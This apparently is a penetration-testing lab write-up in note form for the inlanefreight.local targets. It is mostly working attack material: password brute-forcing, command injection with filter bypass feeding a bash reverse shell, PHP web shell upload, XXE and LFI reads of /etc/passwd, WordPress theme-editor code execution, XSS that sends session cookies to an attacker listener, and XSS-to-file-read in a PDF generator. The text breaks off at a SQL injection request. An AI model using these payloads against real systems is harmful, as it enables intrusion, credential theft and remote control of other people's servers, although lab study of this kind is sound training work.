## inlanefreight.local
#### http (80)
###### direcotry brut
```bsh

╭─kali@kali ~ 
╰─$ gobuster dir -u http://10.129.229.147:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .php      
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.229.147:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/css                  (Status: 301) [Size: 314] [--> http://10.129.229.147/css/]
/fonts                (Status: 301) [Size: 316] [--> http://10.129.229.147/fonts/]
/images               (Status: 301) [Size: 317] [--> http://10.129.229.147/images/]
/index.html           (Status: 200) [Size: 15157]
/monitoring           (Status: 301) [Size: 321] [--> http://10.129.229.147/monitoring/]
/server-status        (Status: 403) [Size: 279]
Progress: 9468 / 9470 (99.98%)
===============================================================
Finished
===============================================================
╭─kali@kali ~ 
```

###### pass brut
```bash
╭─kali@kali /usr/share/seclists/Passwords/Common-Credentials 
╰─$ hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt inlanefreight.local  http-post-form "/monitoring/login.php:username=^USER^&password=^PASS^:F=Invalid" -v 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-05 20:25:59
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1683 login tries (l:17/p:99), ~106 tries per task
[DATA] attacking http-post-form://inlanefreight.local:80/monitoring/login.php:username=^USER^&password=^PASS^:F=Invalid
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 143.00 tries/min, 143 tries in 00:01h, 1540 to do in 00:11h, 16 active
[VERBOSE] Page redirected to http[s]://inlanefreight.local:80/monitoring/index.php
[80][http-post-form] host: inlanefreight.local   login: admin   password: 12qwaszx
[STATUS] 131.33 tries/min, 394 tries in 00:03h, 1289 to do in 00:10h, 16 active
[ERROR] Can not create restore file (./hydra.restore) - Permission denied
[STATUS] 134.14 tries/min, 939 tries in 00:07h, 744 to do in 00:06h, 16 active
```

#### COMMAND injection
we login to http://inlanefreight.local/monitoring and fin a command panel ,
![[Pasted image 20260206214454.png]]

we see that we are only lilmeted to excute some commands ex; date..cat..rm..
```BASH
INLANEFREIGHT ADMIN
admin@inlanefreight:~$ help
ls -
cat -
whoami -
date -
help -
clear -
reboot -
cd -
mv -
rm -
rmdir -
touch -
	connection_test -
```
we try to excute  `connection_test` and get secuuess 
```bash
admin@inlanefreight:~$ connection_test 127.0.0.1
Success
```
now we  reqept the same comand and  interspet this reqest with burb suit  we get this req :
```bash
GET /monitoring/ping.php?ip=127.0.0.1 HTTP/1.1
Host: inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: keep-alive
Referer: http://inlanefreight.local/monitoring/index.php
Cookie: PHPSESSID=bsghe0tpnptbo1j7rj36gqumcs
Priority: u=0
```
we try to inject comand in the reqest url ip arg
```bash
curl 'http://inlanefreight.local/monitoring/ping.php?ip=127.0.0.1;ls'          
Invalid input
```
it seem that  we have a   blacklist filtring the inut commnads ew will try to bypass this by adding **newline character (`%0a`)** 
```bash
curl 'http://inlanefreight.local/monitoring/ping.php?ip=127.0.0.1%0als'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.055 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.055/0.055/0.055/0.000 ms
00112233_flag.txt
css
img
index.php
js
login.php
ping.php
```
ok it work we get comand injectiojn in our hand !!!
now let excute revser shell , 
for bypass the blacklist filtering we will use this caracters 
-    the tabe caracter `%09` for the sapce
-    the   Use Hex Encoding for the revsershell 
  ```bash
  echo -n "bash -i >& /dev/tcp/10.10.16.86/4444 0>&1" | xxd -p
62617368202d69203e26202f6465762f7463702f31302e31302e31362e38
362f3434343420303e2631
  ```
now we will embad this payload to the command in the format:  `127.0.0.1%0abash<<<$(xxd${IFS}-r${IFS}-p<<<HEXDECIMAL_HERE`
now we statrt new  netcat lisner 
```bash
nc -lnvp 4444
```

then pass our  ur final reverse shell commnd   :
```bash
curl 'http://inlanefreight.local/monitoring/ping.php?ip=127.0.0.1%0abash<<<$(xxd%09-r%09-p<<<62617368202d69203e26202f6465762f7463702f31302e31302e31362e38362f3434343420303e2631)'      
```
we get  bacl to our lisner and find that we get a spwn our shll 
![[Pasted image 20260206221453.png]]


---

## careers.inlanefreight.local

we register new user in http://careers.inlanefreight.local then 
weh logi with that user in the user profile link http://careers.inlanefreight.local/profile?id=10 we find the  Jobs applied by our new user (ex.  Marketing Manager)
![[Pasted image 20260207194420.png]]

after we cahnge the id parameter from 10 to 2.3.4.. .. we can see other users profiles Jobs applieds 
http://careers.inlanefreight.local/profile?id=2
![[Pasted image 20260207194756.png]]
so we can see and appy to jobs  using  others users 

## dev.inlanefreight.local
after brutforiing the direocoty 
```bash
╰─$ gobuster dir -u http://dev.inlanefreight.local/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .php       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.inlanefreight.local/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 288]
/.htpasswd            (Status: 403) [Size: 288]
/.htaccess.php        (Status: 403) [Size: 288]
/.htpasswd.php        (Status: 403) [Size: 288]
/.htaccess            (Status: 403) [Size: 288]
/.hta                 (Status: 403) [Size: 288]
/css                  (Status: 301) [Size: 332] [--> http://dev.inlanefreight.local/css/]
Progress: 3137 / 9470 (33.13%)[ERROR] Get "http://dev.inlanefreight.local/dvd.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dwr": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dumps.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dvd": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dumpuser.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dumpuser": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3143 / 9470 (33.19%)[ERROR] Get "http://dev.inlanefreight.local/dyn": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dwr.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3145 / 9470 (33.21%)[ERROR] Get "http://dev.inlanefreight.local/dyn.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dynamic": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3147 / 9470 (33.23%)[ERROR] Get "http://dev.inlanefreight.local/dyop_addtocart": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dyop_delete.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dyop_delete": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dyop_addtocart.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dyop_quan": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dynamic.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3153 / 9470 (33.29%)[ERROR] Get "http://dev.inlanefreight.local/dyop_quan.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/e": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/images               (Status: 301) [Size: 335] [--> http://dev.inlanefreight.local/images/]
/index.php            (Status: 200) [Size: 2048]
/index.php            (Status: 200) [Size: 2048]
/js                   (Status: 301) [Size: 331] [--> http://dev.inlanefreight.local/js/]
/server-status        (Status: 403) [Size: 288]
/upload.php           (Status: 200) [Size: 14]
/uploads              (Status: 301) [Size: 336] [--> http://dev.inlanefreight.local/uploads/]
Progress: 9468 / 9470 (99.98%)
```
we find the` /upload.php `and `/uploads `
let try with open  http://dev.inlanefreight.local/upload.php  
![[Pasted image 20260207202841.png]]
we get 403 Forbidden 
let  use options  with burt suit to show the avilebale  methods
```bash
OPTIONS /upload.php HTTP/1.1
Host: dev.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```
![[Pasted image 20260207202956.png]]
we see the  TRACK in `Allow: GET,POST,PUT,TRACK,OPTIONS`
let use it 
```bash
TRACK /upload.php HTTP/1.1
Host: dev.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```
we get` X-Custom-IP-Authorization: 172.18.0.1` . palying arounf  it  by  chnaging  ip  to `127.0.0.1`  
```bash
TRACK /upload.php HTTP/1.1
Host: dev.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
X-Custom-IP-Authorization: 127.0.0.1
Content-Length: 4


```
![[Pasted image 20260207203225.png]]
we get valid resposne , and we will disply in in the browser by ueing `show response in browser`
 and copy the  url provied by burb suit and past it in our browser 
 ![[Pasted image 20260207203501.png]]
we success access the restricted upload page.

now we will select an image and using burt to intersept the image upload reqest and change the image content and the iamge file  exntetion  to  an   php web shell ` <?php system($_REQUEST['cmd']); ?>` 

```bash
POST /upload.php HTTP/1.1
Host: dev.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------58094647517406505172037383693
Content-Length: 362
Origin: http://dev.inlanefreight.local
Connection: keep-alive
Referer: http://dev.inlanefreight.local/upload.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------58094647517406505172037383693
Content-Disposition: form-data; name="file"; filename="pic.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>

-----------------------------58094647517406505172037383693
Content-Disposition: form-data; name="submit"


-----------------------------58094647517406505172037383693--
```
we get` File uploaded /uploads/pic.p ` indicated we success uplado our webshell 
let confirming our web shell  are working by excuting `id`commnad 
```bash
curl 'http://dev.inlanefreight.local/uploads/pic.php?cmd=id'       
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
we get file uplaod attack 


## gitlab.inlanefreight.local

we can register new gitlab standar user and acess the github profile wihtot permited by admins ..
we reister new user `ahmed` and access and access teh profile as the image :
![[Pasted image 20260212145857.png]]
 
from the `http://gitlab.inlanefreight.local/help` we can see the github version `GitLab Community Edition 15.0.0` so it not too old version since there is no exploit for this version 
![[Pasted image 20260212150019.png]]

from the `http://gitlab.inlanefreight.local/explore` we can see an privet projects repositoryes
![[Pasted image 20260212150249.png]]

we can see the reporistory with the name `shopdev2.inlanefreight.local` look like  new privet subdomain 
accessing  ` http://shopdev2.inlanefreight.local/` it form brpwser confirm  it live and exisite 
![[Pasted image 20260212150656.png]]
we will save it in our notes for later check 

 
 
 ## shopdev2.inlanefreight.local
from the login password panel
![[Pasted image 20260212150656.png]]
we seccues login with the user `admin` and passowrd `admin`

![[Pasted image 20260212154531.png]]
 
 from `mycart` in  `http://shopdev2.inlanefreight.local/cart.php` we click on  the` Complete Purchase ` and intersept the reqest using burpsuit 
![[Pasted image 20260212160420.png]]
 we  notise an xml elemnts `userid` is reflected, we can inject into it.  
 ```xml
 POST /checkout.php HTTP/1.1
Host: shopdev2.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 153
Origin: http://shopdev2.inlanefreight.local
Connection: keep-alive
Referer: http://shopdev2.inlanefreight.local/cart.php
Cookie: PHPSESSID=aplf4snfsuksjk320d54b7r0g6
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY xml "XML">
]>

<root><subtotal>undefined</subtotal><userid>&xml;</userid></root>
 ```
![[Pasted image 20260212160719.png]]
from `User: XML` we confirm the xml injection attack existe 
now we will use it to `local file read `:
```bash
POST /checkout.php HTTP/1.1
Host: shopdev2.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 183
Origin: http://shopdev2.inlanefreight.local
Connection: keep-alive
Referer: http://shopdev2.inlanefreight.local/cart.php
Cookie: PHPSESSID=aplf4snfsuksjk320d54b7r0g6
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>

<root><subtotal>undefined</subtotal><userid>&company;</userid></root>
```
![[Pasted image 20260212160843.png]]
we sucess read local file via the xml injection 
we can aloso read the web source files , from example the` index.php`
```bash
POST /checkout.php HTTP/1.1
Host: shopdev2.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 218
Origin: http://shopdev2.inlanefreight.local
Connection: keep-alive
Referer: http://shopdev2.inlanefreight.local/cart.php
Cookie: PHPSESSID=aplf4snfsuksjk320d54b7r0g6
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>

<root><subtotal>undefined</subtotal><userid>&company;</userid></root>
```

![[Pasted image 20260212161244.png]]


## ir.inlanefreight.local

the site look like a wordpress let confirming it 
```bash
 curl 'http://ir.inlanefreight.local' | grep WordPress                                     0<meta name="generator" content="WordPress 6.0" />
```
running  the wpscan on the site to enum the phildin and the users 

```bash
╰─$ wpscan --url http://ir.inlanefreight.local  -e ap,u                                                                                                                                  130 ↵
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://ir.inlanefreight.local/ [10.129.2.30]
[+] Started: Thu Feb 12 19:36:51 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.53 (Debian)
 |  - X-Powered-By: PHP/7.4.29
 |  - Via: 1.1 ir.inlanefreight.local
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://ir.inlanefreight.local/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://ir.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://ir.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://ir.inlanefreight.local/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://ir.inlanefreight.local/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://ir.inlanefreight.local/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: cbusiness-investment
 | Location: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/
 | Last Updated: 2024-03-13T00:00:00.000Z
 | Readme: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt
 | [!] The version is out of date, the latest version is 0.9
 | Style URL: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0
 | Style Name: CBusiness Investment
 | Style URI: https://www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/
 | Description: CBusiness Investment WordPress theme is used for all type of corporate business. That Multipurpose T...
 | Author: Themescave
 | Author URI: http://www.themescave.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Match: 'Version: 0.7'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] b2i-investor-tools
 | Location: http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/
 | Last Updated: 2025-05-22T05:29:00.000Z
 | [!] The version is out of date, the latest version is 1.0.8.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0.5 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/style.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/export.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/wb_script.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amcharts.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/serial.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amstock.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/export.js?ver=1.0.5
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/readme.txt

[+] mail-masta
 | Location: http://ir.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:10 <===============> (10 / 10) 100.00% Time: 00:00:10

[i] User(s) Identified:

[+] ilfreightwp
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

from the phulding enum we get `mail masta Version: 1.0`
search on exploits for this version  we find  exploit [WordPress Plugin Mail Masta 1.0 - Local File Inclusion](https://www.exploit-db.com/exploits/40290)
proof exploit the lfi :
```bash
curl 'http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

also from theenum users we get the users : `ilfreightwp` ,`james`, `tom`, `john`

let do bruforcing wordpress admin panel with thoes useres we get :

```bash
wpscan --password-attack xmlrpc -U users.txt -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top100.txt --url http://ir.inlanefreight.local -t 20    
<SNIP>
[!] Valid Combinations Found:
 | Username: ilfreightwp, Password: password1
 <SNIP>                      
```
we find a valid creds` ilfreightwp, Password: password1 ` we will use them to loginn to the admin panel  
![[Pasted image 20260212195712.png]]
after login we  go to Click on `Appearance` on the side panel and select` Theme Editor`. This page will let us edit the PHP source code directly. we add our web shell `system($_GET[0]);`

![[Pasted image 20260212195650.png]]

then excute it 
```bash
curl 'http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php?0=id' 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
and we get removte code excution 


## monitoring.inlanefreight.local
access the site redirect us to login page http://monitoring.inlanefreight.local/login.php
by  make bruforicng  on the logn page 
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt monitoring.inlanefreight.local http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid Credentials" -v -f 
<SNIP>
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
<SNIP>
```
we get username : admin and    password: 12qwaszx


##  support.inlanefreight.local
acces  http://support.inlanefreight.local/ticket.php show us an  `Raise Ticket ` to send a ticket to the supprt  team  

let try javascrpt injection in the name fild 
open netcat lisneter 
```bash
 nc -lnvp 80   
```  
injecting the message with javascript payload `"> <script src=http://10.10.16.43/script.js></script>`   in the message fild and submit the ticket 
 
![[Pasted image 20260212212848.png]]
we get reqesut  in our netcat lisnner 
```bash 
nc -lnvp 80                                                                     
listening on [any] 80 ...
connect to [10.10.16.43] from (UNKNOWN) [10.129.229.147] 36580
GET /?c=session=fcfaf93ab169bc943b92109f0a845d99 HTTP/1.1
Host: 10.10.16.43
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: HTBXSS/1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```
now let steakl the cokkis using the payload  in the message fild  and submit the ticket 
```bash
"> <script>document.location="http://10.10.16.43/?c=" document.cookie;<%
```
![[Pasted image 20260212213439.png]]

nback to our lisnner we get a reqest and the cooki of some of the support tram who open our ticket 
```bash
listening on [any] 80 ...
connect to [10.10.16.43] from (UNKNOWN) [10.129.229.147] 36990
GET /?c=session=fcfaf93ab169bc943b92109f0a845d99 HTTP/1.1
Host: 10.10.16.43
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: HTBXSS/1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

the cokkies is : `session=fcfaf93ab169bc943b92109f0a845d99` we will add it in our browser usn cookies editor 
![[Pasted image 20260212213841.png]]
after that  we click on login it will take us to the admin panel 

![[Pasted image 20260212213612.png]]


## tracking.inlanefreight.local
opening the site http://tracking.inlanefreight.local/ oru eyes go to intersting input  box to traceig the packet by number  in the index  interface page 

by testing a  javascript payload to write "aaaa" 
```bash
<script> document.write("aaaa") </script>
```
![[Pasted image 20260212234043.png]]
and in the generateed pdf we can see the  generated pdf contain "aaaa" indicat the javascript it work 
![[Pasted image 20260212234220.png]]

testing the **SSRF** 
oepn netcat lisnner 
```bash
nc -lnvp 80
```
then pass this payload  in the tracking number input
```bash
<iframe src="http://10.10.16.43/"></iframe>
```
and we see the netcatv lisnner get an reqest friom the [[server ip ](http://tracking.inlanefreight.local/)](http://tracking.inlanefreight.local/) 
```bash
nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.16.43] from (UNKNOWN) [10.129.229.147] 56316
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.10.16.43
```

after doing reasrch  i find a writeup paper https://web.archive.org/web/20221207162417/https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/ 
we can escelate the ssrf and javascript excution to  the Local file read  in the generated pdf file 
we will use this paylaod to read the /etc/passwd fle
```bash
<script>
    x=new XMLHttpRequest;
    x.onload=function(){  
    document.write(this.responseText)
};
    x.open("GET","file:///etc/passwd");
    x.send();
</script>
```
after entring it in the tracking number input we can see in the generateed pdf file the /etc/passwd content fie witch is the extected 

## status.inlanefreight.local
access he site show us the searfhc box we rty sql inejction on i t
shwo us an sql inecjtioni indicator ` You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1 `
![[Pasted image 20260213003900.png]]

we use burt suit to intersept the reqesut 
![[Pasted image 20260213004011.png]]
copy the reqestto  adn save it to a file  `req.txt`  then edit it by adding the `*` to it 
```bash
POST / HTTP/1.1
Host: status.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
